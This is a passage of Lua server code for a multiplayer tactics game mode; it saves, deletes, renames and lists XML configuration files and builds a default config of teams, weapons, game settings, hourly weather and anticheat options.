                local allHandlings = getTacticsData("handlings", false) or {};
                for vehicleModelID2 = 400, 611 do
                    if #getVehicleNameFromModel(vehicleModelID2) > 0 then
                        local handlingNode2 = nil;
                        local pairsFunc5 = pairs;
                        local modelHandling = allHandlings[vehicleModelID2] or {};
                        for handlingAttrName, handlingAttrValue in pairsFunc5(modelHandling) do
                            if handlingAttrValue ~= nil then
                                if not handlingNode2 then
                                    handlingNode2 = xmlCreateChild(handlingsNode, "handling");
                                    xmlNodeSetAttribute(handlingNode2, "model", tostring(vehicleModelID2));
                                end;
                                if handlingAttrName == "sirens" then
                                    sirenDataString = "[" .. tostring(handlingAttrValue.count) .. "," .. tostring(handlingAttrValue.type) .. "," .. (handlingAttrValue.flags["360"] and "1" or "0") .. "," .. (handlingAttrValue.flags.DoLOSCheck and "1" or "0") .. "," .. (handlingAttrValue.flags.UseRandomiser and "1" or "0") .. "," .. (handlingAttrValue.flags.Silent and "1" or "0");
                                    for sirenIndex3 = 1, handlingAttrValue.count do
                                        sirenDataString = sirenDataString .. string.format(",%.3f,%.3f,%.3f,'%s',%d", handlingAttrValue[sirenIndex3].x, handlingAttrValue[sirenIndex3].y, handlingAttrValue[sirenIndex3].z, handlingAttrValue[sirenIndex3].color, handlingAttrValue[sirenIndex3].minalpha);
                                    end;
                                    xmlNodeSetAttribute(handlingNode2, handlingAttrName, sirenDataString .. "]");
                                elseif type(handlingAttrValue) == "table" then
                                    xmlNodeSetAttribute(handlingNode2, handlingAttrName, "[" .. handlingAttrValue[1] .. "," .. handlingAttrValue[2] .. "," .. handlingAttrValue[3] .. "]");
                                elseif handlingAttrName == "modelFlags" or handlingAttrName == "handlingFlags" then
                                    xmlNodeSetAttribute(handlingNode2, handlingAttrName, string.reverse(string.format("%08X", tonumber(handlingAttrValue))));
                                else
                                    xmlNodeSetAttribute(handlingNode2, handlingAttrName, tostring(handlingAttrValue));
                                end;
                            end;
                        end;
                    end;
                end;
            end;
            if saveOptions.Weather then
                local weatherNode2 = xmlCreateChild(saveXML, "weather");
                local allWeatherData = getTacticsData("Weather", false) or {};
                for hourIndex = 0, 23 do
                    if allWeatherData[hourIndex] then
                        local weatherHourNode = xmlCreateChild(weatherNode2, "weather");
                        xmlNodeSetAttribute(weatherHourNode, "hour", tostring(hourIndex));
                        xmlNodeSetAttribute(weatherHourNode, "wind", string.format("[%.2f,%.2f,%.2f]", allWeatherData[hourIndex].wind[1], allWeatherData[hourIndex].wind[2], allWeatherData[hourIndex].wind[3]));
                        xmlNodeSetAttribute(weatherHourNode, "rain", tostring(allWeatherData[hourIndex].rain));
                        xmlNodeSetAttribute(weatherHourNode, "far", tostring(allWeatherData[hourIndex].far));
                        xmlNodeSetAttribute(weatherHourNode, "fog", tostring(allWeatherData[hourIndex].fog));
                        xmlNodeSetAttribute(weatherHourNode, "sky", string.format("[%i,%i,%i,%i,%i,%i]", allWeatherData[hourIndex].sky[1], allWeatherData[hourIndex].sky[2], allWeatherData[hourIndex].sky[3], allWeatherData[hourIndex].sky[4], allWeatherData[hourIndex].sky[5], allWeatherData[hourIndex].sky[6]));
                        xmlNodeSetAttribute(weatherHourNode, "clouds", tostring(allWeatherData[hourIndex].clouds));
                        xmlNodeSetAttribute(weatherHourNode, "birds", tostring(allWeatherData[hourIndex].birds));
                        xmlNodeSetAttribute(weatherHourNode, "sun", string.format("[%i,%i,%i,%i,%i,%i,%.2f]", allWeatherData[hourIndex].sun[1], allWeatherData[hourIndex].sun[2], allWeatherData[hourIndex].sun[3], allWeatherData[hourIndex].sun[4], allWeatherData[hourIndex].sun[5], allWeatherData[hourIndex].sun[6], allWeatherData[hourIndex].sunsize));
                        xmlNodeSetAttribute(weatherHourNode, "water", string.format("[%i,%i,%i,%i]", allWeatherData[hourIndex].water[1], allWeatherData[hourIndex].water[2], allWeatherData[hourIndex].water[3], allWeatherData[hourIndex].water[4]));
                        xmlNodeSetAttribute(weatherHourNode, "wave", tostring(allWeatherData[hourIndex].wave));
                        xmlNodeSetAttribute(weatherHourNode, "level", tostring(allWeatherData[hourIndex].level));
                        xmlNodeSetAttribute(weatherHourNode, "heat", tostring(allWeatherData[hourIndex].heat));
                        xmlNodeSetAttribute(weatherHourNode, "effect", tostring(allWeatherData[hourIndex].effect));
                    end;
                end;
            end;
            if saveOptions.AC then
                local anticheatNode2 = xmlCreateChild(saveXML, "anticheat");
                xmlNodeSetAttribute(anticheatNode2, "action_detection", getTacticsData("anticheat", "action_detection", false));
                local anticheatChild = xmlCreateChild(anticheatNode2, "speedhach");
                xmlNodeSetAttribute(anticheatChild, "enable", getTacticsData("anticheat", "speedhach", false));
                anticheatChild = xmlCreateChild(anticheatNode2, "godmode");
                xmlNodeSetAttribute(anticheatChild, "enable", getTacticsData("anticheat", "godmode", false));
                anticheatChild = xmlCreateChild(anticheatNode2, "mods");
                xmlNodeSetAttribute(anticheatChild, "enable", getTacticsData("anticheat", "mods", false));
                local ipairsFunc = ipairs;
                local modsListData = getTacticsData("anticheat", "modslist", false) or {};
                for _, modEntry in ipairsFunc(modsListData) do
                    modChildNode = xmlCreateChild(anticheatChild, "mod");
                    xmlNodeSetAttribute(modChildNode, "name", modEntry.name);
                    xmlNodeSetAttribute(modChildNode, "search", modEntry.search);
                    xmlNodeSetAttribute(modChildNode, "type", modEntry.type);
                end;
            end;
            xmlSaveFile(saveXML);
            xmlUnloadFile(saveXML);
            if configToSave == getCurrentConfig() then
                startConfig(configToSave);
            else
                refreshConfiglist(root);
            end;
            return true;
        end;
    end;
    deleteConfig = function(configToDelete, _) 
        if fileExists("config/" .. tostring(configToDelete) .. ".xml") then
            fileDelete("config/" .. tostring(configToDelete) .. ".xml");
            local currentConfigName = getCurrentConfig();
            local configsXML3 = xmlLoadFile("config/configs.xml");
            for _, configNode3 in ipairs(xmlNodeGetChildren(configsXML3)) do
                if xmlNodeGetName(configNode3) == "config" and xmlNodeGetAttribute(configNode3, "src") == tostring(configToDelete) then
                    xmlDestroyNode(configNode3);
                end;
            end;
            xmlSaveFile(configsXML3);
            xmlUnloadFile(configsXML3);
            if tostring(currentConfigName) == tostring(configToDelete) then
                setTimer(defaultConfig, 50, 1);
            else
                refreshConfiglist(root);
            end;
            return true;
        else
            return false;
        end;
    end;
    renameConfig = function(oldConfigName, newConfigName, _) 
        if fileExists("config/" .. tostring(oldConfigName) .. ".xml") and not fileExists("config/" .. tostring(newConfigName) .. ".xml") then
            local configsXML4 = xmlLoadFile("config/configs.xml");
            for _, configNode4 in ipairs(xmlNodeGetChildren(configsXML4)) do
                if xmlNodeGetName(configNode4) == "config" and xmlNodeGetAttribute(configNode4, "src") == tostring(newConfigName) then
                    return false;
                end;
            end;
            if not fileRename("config/" .. tostring(oldConfigName) .. ".xml", "config/" .. tostring(newConfigName) .. ".xml") then
                return false;
            else
                for _, configNode5 in ipairs(xmlNodeGetChildren(configsXML4)) do
                    if xmlNodeGetName(configNode5) == "current" and xmlNodeGetAttribute(configNode5, "src") == tostring(oldConfigName) then
                        xmlNodeSetAttribute(configNode5, "src", tostring(newConfigName));
                    end;
                    if xmlNodeGetName(configNode5) == "config" and xmlNodeGetAttribute(configNode5, "src") == tostring(oldConfigName) then
                        xmlNodeSetAttribute(configNode5, "src", tostring(newConfigName));
                    end;
                end;
                xmlSaveFile(configsXML4);
                xmlUnloadFile(configsXML4);
                refreshConfiglist(root);
                return true;
            end;
        else
            return false;
        end;
    end;
    addConfig = function(configToAdd, _) 
        if fileExists("config/" .. tostring(configToAdd) .. ".xml") then
            local configsXML5 = xmlLoadFile("config/configs.xml");
            for _, configNode6 in ipairs(xmlNodeGetChildren(configsXML5)) do
                if xmlNodeGetName(configNode6) == "config" and xmlNodeGetAttribute(configNode6, "src") == tostring(configToAdd) then
                    return false;
                end;
            end;
            local addedConfigNode = xmlCreateChild(configsXML5, "config");
            xmlNodeSetAttribute(addedConfigNode, "src", tostring(configToAdd));
            xmlSaveFile(configsXML5);
            xmlUnloadFile(configsXML5);
            refreshConfiglist(root);
            return true;
        else
            return false;
        end;
    end;
    defaultConfig = function(isFirstLoad) 
        if not fileExists("config/_default.xml") then
            local configsXML6 = xmlLoadFile("config/configs.xml");
            local defaultConfigNode = xmlCreateChild(configsXML6, "config");
            xmlNodeSetAttribute(defaultConfigNode, "src", "_default");
            xmlSaveFile(configsXML6);
            xmlUnloadFile(configsXML6);
        else
            if fileExists("config/_default.xml") then
                local success = fileDelete("config/_default.xml");
                    if not success then
                        return false;
                    end;
            end;
        end;
        local defaultXML = xmlCreateFile("config/_default.xml", "config");
        local sectionNode = xmlCreateChild(defaultXML, "teams");
        local refereeConfigNode = xmlCreateChild(sectionNode, "referee");
        xmlNodeSetAttribute(refereeConfigNode, "name", "Referee");
        xmlNodeSetAttribute(refereeConfigNode, "color", "[255,255,255]");
        local teamConfigNode = xmlCreateChild(sectionNode, "team");
        xmlNodeSetAttribute(teamConfigNode, "name", "Team1");
        xmlNodeSetAttribute(teamConfigNode, "skins", "[292]");
        xmlNodeSetAttribute(teamConfigNode, "color", "[192,96,0]");
        xmlNodeSetAttribute(teamConfigNode, "side", "1");
        teamConfigNode = xmlCreateChild(sectionNode, "team");
        xmlNodeSetAttribute(teamConfigNode, "name", "Team2");
        xmlNodeSetAttribute(teamConfigNode, "skins", "[308]");
        xmlNodeSetAttribute(teamConfigNode, "color", "[0,96,192]");
        xmlNodeSetAttribute(teamConfigNode, "side", "2");
        sectionNode = xmlCreateChild(defaultXML, "weaponpack");
        xmlNodeSetAttribute(sectionNode, "slots", "3");
        teamConfigNode = xmlCreateChild(sectionNode, "weapons");
        xmlNodeSetAttribute(teamConfigNode, "silenced", "102");
        xmlNodeSetAttribute(teamConfigNode, "deagle", "49");
        xmlNodeSetAttribute(teamConfigNode, "shotgun", "80");
        xmlNodeSetAttribute(teamConfigNode, "spas12", "49");
        xmlNodeSetAttribute(teamConfigNode, "mp5", "210");
        xmlNodeSetAttribute(teamConfigNode, "ak47", "300");
        xmlNodeSetAttribute(teamConfigNode, "m4", "200");
        xmlNodeSetAttribute(teamConfigNode, "rifle", "100");
        xmlNodeSetAttribute(teamConfigNode, "sniper", "50");
        xmlNodeSetAttribute(teamConfigNode, "grenade", "1");
        xmlNodeSetAttribute(teamConfigNode, "teargas", "1");
        xmlNodeSetAttribute(teamConfigNode, "molotov", "1");
        xmlNodeSetAttribute(teamConfigNode, "knife", "1");
        teamConfigNode = xmlCreateChild(sectionNode, "balance");
        teamConfigNode = xmlCreateChild(sectionNode, "cost");
        teamConfigNode = xmlCreateChild(sectionNode, "slot");
        sectionNode = xmlCreateChild(defaultXML, "shooting");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "22");
        xmlNodeSetAttribute(teamConfigNode, "maximum_clip_ammo", "17");
        xmlNodeSetAttribute(teamConfigNode, "flags", "3303");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "26");
        xmlNodeSetAttribute(teamConfigNode, "maximum_clip_ammo", "2");
        xmlNodeSetAttribute(teamConfigNode, "flags", "3303");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "28");
        xmlNodeSetAttribute(teamConfigNode, "maximum_clip_ammo", "50");
        xmlNodeSetAttribute(teamConfigNode, "flags", "3303");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "30");
        xmlNodeSetAttribute(teamConfigNode, "damage", "12");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "32");
        xmlNodeSetAttribute(teamConfigNode, "maximum_clip_ammo", "50");
        xmlNodeSetAttribute(teamConfigNode, "flags", "3303");
        teamConfigNode = xmlCreateChild(sectionNode, "properties");
        xmlNodeSetAttribute(teamConfigNode, "weapon", "33");
        xmlNodeSetAttribute(teamConfigNode, "flags", "830A");
        sectionNode = xmlCreateChild(defaultXML, "handlings");
        sectionNode = xmlCreateChild(defaultXML, "settings");
        teamConfigNode = xmlCreateChild(sectionNode, "settings");
        xmlNodeSetAttribute(teamConfigNode, "autobalance", "false");
        xmlNodeSetAttribute(teamConfigNode, "autoswap", "true");
        xmlNodeSetAttribute(teamConfigNode, "blurlevel", "0");
        xmlNodeSetAttribute(teamConfigNode, "countdown_auto", "true");
        xmlNodeSetAttribute(teamConfigNode, "countdown_force", "0:10");
        xmlNodeSetAttribute(teamConfigNode, "countdown_start", "3");
        xmlNodeSetAttribute(teamConfigNode, "dontfire", "false");
        xmlNodeSetAttribute(teamConfigNode, "friendly_fire", "false");
        xmlNodeSetAttribute(teamConfigNode, "gamespeed", "1.0");
        xmlNodeSetAttribute(teamConfigNode, "ghostmode", "none|none,team,all");
        xmlNodeSetAttribute(teamConfigNode, "gravity", "0.008");
        xmlNodeSetAttribute(teamConfigNode, "heli_killing", "true");
        xmlNodeSetAttribute(teamConfigNode, "player_can_driveby", "true");
        xmlNodeSetAttribute(teamConfigNode, "player_dead_visible", "true");
        xmlNodeSetAttribute(teamConfigNode, "player_nametag", "all|none,team,all");
        xmlNodeSetAttribute(teamConfigNode, "player_radarblip", "team|none,team,all");
        xmlNodeSetAttribute(teamConfigNode, "player_information", "true");
        xmlNodeSetAttribute(teamConfigNode, "player_start_armour", "0");
        xmlNodeSetAttribute(teamConfigNode, "player_start_health", "100");
        xmlNodeSetAttribute(teamConfigNode, "respawn", "false");
        xmlNodeSetAttribute(teamConfigNode, "respawn_lives", "0");
        xmlNodeSetAttribute(teamConfigNode, "respawn_time", "0:05");
        xmlNodeSetAttribute(teamConfigNode, "spectate_enemy", "false");
        xmlNodeSetAttribute(teamConfigNode, "stealth_killing", "true");
        xmlNodeSetAttribute(teamConfigNode, "streetlamps", "true");
        xmlNodeSetAttribute(teamConfigNode, "time", "12:00");
        xmlNodeSetAttribute(teamConfigNode, "time_locked", "false");
        xmlNodeSetAttribute(teamConfigNode, "time_minuteduration", "1000");
        xmlNodeSetAttribute(teamConfigNode, "timeout_to_pause", "false");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_color", "teamcolor|default,teamcolor");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_per_player", "2");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_nametag", "true");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_radarblip", "unoccupied|none,unoccupied,always");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_respawn_blown", "0:00");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_respawn_idle", "0:00");
        xmlNodeSetAttribute(teamConfigNode, "vehicle_tank_explodable", "false");
        xmlNodeSetAttribute(teamConfigNode, "vote", "true");
        xmlNodeSetAttribute(teamConfigNode, "vote_duration", "0:20");
        teamConfigNode = xmlCreateChild(sectionNode, "glitches");
        xmlNodeSetAttribute(teamConfigNode, "quickreload", "false");
        xmlNodeSetAttribute(teamConfigNode, "fastmove", "true");
        xmlNodeSetAttribute(teamConfigNode, "fastfire", "true");
        xmlNodeSetAttribute(teamConfigNode, "crouchbug", "true");
        xmlNodeSetAttribute(teamConfigNode, "fastsprint", "true");
        xmlNodeSetAttribute(teamConfigNode, "quickstand", "true");
        teamConfigNode = xmlCreateChild(sectionNode, "cheats");
        xmlNodeSetAttribute(teamConfigNode, "hovercars", "false");
        xmlNodeSetAttribute(teamConfigNode, "aircars", "false");
        xmlNodeSetAttribute(teamConfigNode, "extrabunny", "false");
        xmlNodeSetAttribute(teamConfigNode, "extrajump", "false");
        xmlNodeSetAttribute(teamConfigNode, "magnetcars", "false");
        xmlNodeSetAttribute(teamConfigNode, "knockoffbike", "true");
        teamConfigNode = xmlCreateChild(sectionNode, "limites");
        xmlNodeSetAttribute(teamConfigNode, "fps_limit", "50");
        xmlNodeSetAttribute(teamConfigNode, "fps_minimal", "0");
        xmlNodeSetAttribute(teamConfigNode, "ping_maximal", "65536");
        xmlNodeSetAttribute(teamConfigNode, "packetloss_second", "0");
        xmlNodeSetAttribute(teamConfigNode, "packetloss_total", "0");
        xmlNodeSetAttribute(teamConfigNode, "warnings_fps", "10");
        xmlNodeSetAttribute(teamConfigNode, "warnings_ping", "10");
        xmlNodeSetAttribute(teamConfigNode, "warnings_packetloss", "3");
        local pairsFunc6 = pairs;
        local definedModesTable = getTacticsData("modes_defined") or {};
        for modeKey2 in pairsFunc6(definedModesTable) do
            teamConfigNode = xmlCreateChild(sectionNode, "mode");
            xmlNodeSetAttribute(teamConfigNode, "name", modeKey2);
            xmlNodeSetAttribute(teamConfigNode, "enable", "true");
            local pairsFunc7 = pairs;
            local modeSettingsData = getTacticsData("modes_settings", modeKey2) or {};
            for modeSettingKey2, modeSettingValue2 in pairsFunc7(modeSettingsData) do
                xmlNodeSetAttribute(teamConfigNode, modeSettingKey2, modeSettingValue2);
            end;
        end;
        sectionNode = xmlCreateChild(defaultXML, "mappack");
        xmlNodeSetAttribute(sectionNode, "automatics", "lobby|lobby,cycler,voting,random");
        teamConfigNode = xmlCreateChild(sectionNode, "cycler");
        xmlNodeSetAttribute(teamConfigNode, "resnames", "[]");
        teamConfigNode = xmlCreateChild(sectionNode, "disabled");
        xmlNodeSetAttribute(teamConfigNode, "resnames", "[]");
        sectionNode = xmlCreateChild(defaultXML, "vehiclepack");
        xmlNodeSetAttribute(sectionNode, "models", "[407,425,430,432,435,441,447,449,450,464,465,476,501,520,584,591,601,537,538,564,569,570,590,594,606,607,610,608,611]");
        sectionNode = xmlCreateChild(defaultXML, "weather");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "0");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[0,23,24,0,31,32]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "false");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,128,0,5,0,0,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[85,85,65,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "400.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "100.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "5");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[0,20,20,0,31,32]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,128,0,255,128,0,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[53,104,104,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "400.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "100.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "6");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[90,205,255,200,144,85]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,128,0,255,128,0,8.40]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[90,170,170,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "100.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "7");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[90,205,255,90,200,255]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,255,255,255,255,255,2.20]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[145,170,170,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "100.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "12");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[68,117,210,36,117,199]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,255,255,255,255,255,1.10]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[90,170,170,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "10.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "19");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[68,117,210,36,117,194]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[222,88,0,122,55,0,3.90]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[50,97,97,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "10.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "20");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[181,150,84,167,108,65]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,128,0,255,128,0,2.00]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[67,67,67,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "10.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        teamConfigNode = xmlCreateChild(sectionNode, "weather");
        xmlNodeSetAttribute(teamConfigNode, "hour", "22");
        xmlNodeSetAttribute(teamConfigNode, "sky", "[137,100,84,60,50,52]");
        xmlNodeSetAttribute(teamConfigNode, "clouds", "true");
        xmlNodeSetAttribute(teamConfigNode, "birds", "true");
        xmlNodeSetAttribute(teamConfigNode, "sun", "[255,128,0,5,8,0,1.00]");
        xmlNodeSetAttribute(teamConfigNode, "water", "[67,67,62,240]");
        xmlNodeSetAttribute(teamConfigNode, "wave", "0.5");
        xmlNodeSetAttribute(teamConfigNode, "level", "0");
        xmlNodeSetAttribute(teamConfigNode, "wind", "[0.16,0.15,0.00]");
        xmlNodeSetAttribute(teamConfigNode, "rain", "0");
        xmlNodeSetAttribute(teamConfigNode, "heat", "0");
        xmlNodeSetAttribute(teamConfigNode, "far", "800.00");
        xmlNodeSetAttribute(teamConfigNode, "fog", "10.00");
        xmlNodeSetAttribute(teamConfigNode, "effect", "0");
        sectionNode = xmlCreateChild(defaultXML, "anticheat");
        xmlNodeSetAttribute(sectionNode, "action_detection", "chat|chat,adminchat,kick");
        teamConfigNode = xmlCreateChild(sectionNode, "speedhach");
        xmlNodeSetAttribute(teamConfigNode, "enable", "true");
        teamConfigNode = xmlCreateChild(sectionNode, "godmode");
        xmlNodeSetAttribute(teamConfigNode, "enable", "true");
        teamConfigNode = xmlCreateChild(sectionNode, "mods");
        xmlNodeSetAttribute(teamConfigNode, "enable", "true");
        modChildNode = xmlCreateChild(teamConfigNode, "mod");
        xmlNodeSetAttribute(modChildNode, "name", "Animations");
        xmlNodeSetAttribute(modChildNode, "search", "*.ifp");
        xmlNodeSetAttribute(modChildNode, "type", "name");
        modChildNode = xmlCreateChild(teamConfigNode, "mod");
        xmlNodeSetAttribute(modChildNode, "name", "Collisions");
        xmlNodeSetAttribute(modChildNode, "search", "*.col");
        xmlNodeSetAttribute(modChildNode, "type", "name");
        xmlSaveFile(defaultXML);
        xmlUnloadFile(defaultXML);
        startConfig("_default", isFirstLoad);
    end;
    refreshConfiglist = function(targetPlayer2) 
        local configsData = {};
        local configsXML7 = nil;
        local currentConfigSrc = nil;
        local configSrc = nil;
        local currentNode = nil;
        configsXML7 = xmlLoadFile("config/configs.xml");
        for _, configNode7 in ipairs(xmlNodeGetChildren(configsXML7)) do
            if xmlNodeGetName(configNode7) == "current" then
                currentConfigSrc = xmlNodeGetAttribute(configNode7, "src");
                currentNode = configNode7;
            end;
            if xmlNodeGetName(configNode7) == "config" then
                configSrc = xmlNodeGetAttribute(configNode7, "src");
                if not fileExists("config/" .. configSrc .. ".xml") then
                    xmlDestroyNode(configNode7);
                    if configSrc == currentConfigSrc then
                        xmlNodeSetAttribute(currentNode, "src", "_default");
                    end;
                else
                    local configFlags = "";
                    local configFileXML = xmlLoadFile("config/" .. configSrc .. ".xml");
                    if xmlFindChild(configFileXML, "mappack", 0) then
                        configFlags = configFlags .. "M ";
                    end;
                    if xmlFindChild(configFileXML, "settings", 0) then
                        configFlags = configFlags .. "S ";
                    end;
                    if xmlFindChild(configFileXML, "teams", 0) then
                        configFlags = configFlags .. "T ";
                    end;
                    if xmlFindChild(configFileXML, "weaponpack", 0) then
                        configFlags = configFlags .. "Wp ";
                    end;
                    if xmlFindChild(configFileXML, "vehiclepack", 0) then
                        configFlags = configFlags .. "V ";
                    end;
                    if xmlFindChild(configFileXML, "weather", 0) then
                        configFlags = configFlags .. "Wh ";
                    end;
                    if xmlFindChild(configFileXML, "shooting", 0) then
                        configFlags = configFlags .. "Sh ";
                    end;
                    if xmlFindChild(configFileXML, "handlings", 0) then
                        configFlags = configFlags .. "H ";
                    end;
                    if xmlFindChild(configFileXML, "anticheat", 0) then
                        configFlags = configFlags .. "AC ";
                    end;
                    xmlUnloadFile(configFileXML);
                    if configSrc == currentConfigSrc then
                        table.insert(configsData, {
                            configSrc, 
                            0, 
                            configFlags
                        });
                    else
                        table.insert(configsData, {
                            configSrc, 
                            255, 
                            configFlags
                        });
                    end;
                end;
            end;
        end;
        xmlSaveFile(configsXML7);
        xmlUnloadFile(configsXML7);
        callClientFunction(targetPlayer2, "refreshConfiglist", configsData);
    end;
    onPlayerJoin = function() 
        setElementData(source, "IP", hasObjectPermissionTo(getThisResource(), "function.getClientIP", false) and getPlayerIP(source) or "Not Permission");
        setElementData(source, "Serial", getPlayerSerial(source));
        setElementData(source, "Version", getPlayerVersion(source));
    end;
    onRoundCommandStart = function(commandPlayer, modeCommand, mapNameParam) 
        if not hasObjectPermissionTo(commandPlayer, "general.tactics_maps", false) then
            return outputLangString(commandPlayer, "you_have_not_permissions");
        elseif not mapNameParam then
            return startMap(modeCommand);
        else
            local mapResource = getResourceFromName(string.lower(modeCommand .. "_" .. mapNameParam));
            if mapResource and getResourceInfo(mapResource, "type") == "map" then
                startMap(mapResource);
                return true;
            else
                return false;
            end;
        end;
    end;
    onRoundStop = function(stopPlayer) 
        if not hasObjectPermissionTo(stopPlayer, "general.tactics_maps", false) then
            outputLangString(stopPlayer, "you_have_not_permissions");
            return false;
        else
            local disabledMapsTable2 = getTacticsData("map_disabled") or {};
            local lobbyMapsList = {};
